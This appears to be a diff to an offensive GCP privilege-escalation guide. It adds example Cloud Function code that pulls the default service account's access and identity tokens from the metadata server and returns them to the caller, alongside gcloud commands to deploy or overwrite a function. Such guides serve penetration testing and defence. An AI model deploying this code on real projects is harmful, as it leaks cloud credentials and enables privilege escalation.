@@ -336,6 +336,30 @@ gcloud functions list
 - Permissions: `cloudfunctions.functions.create`, `cloudfunctions.functions.update`, `cloudfunctions.functions.call`
 - `iam.serviceAccounts.actAs` when a service account is in use
 
+#### Example code
+```
+import subprocess
+import random
+import io
+import string
+import json
+import os
+from urllib.request import Request, urlopen
+from base64 import b64decode, b64encode
+
+def hello_world(request):
+    request_json = request.get_json()
+    req = Request('http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token')
+    req.add_header('Metadata-Flavor', 'Google')
+    content = urlopen(req).read()
+    token = json.loads(content)
+    req = Request('http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/identity?audience=32555940559.apps.googleusercontent.com')
+    req.add_header('Metadata-Flavor', 'Google')
+    content = urlopen(req).read()
+    token["identity"] = content.decode("utf-8")
+    return json.dumps(token)
+```
+
 #### Create / Update existing cloud function source code
 ```
 gcloud functions deploy <CLOUD FUNCTION NAME> --timeout 539 --source <PATH TO SOURCE CODE> --runtime python37
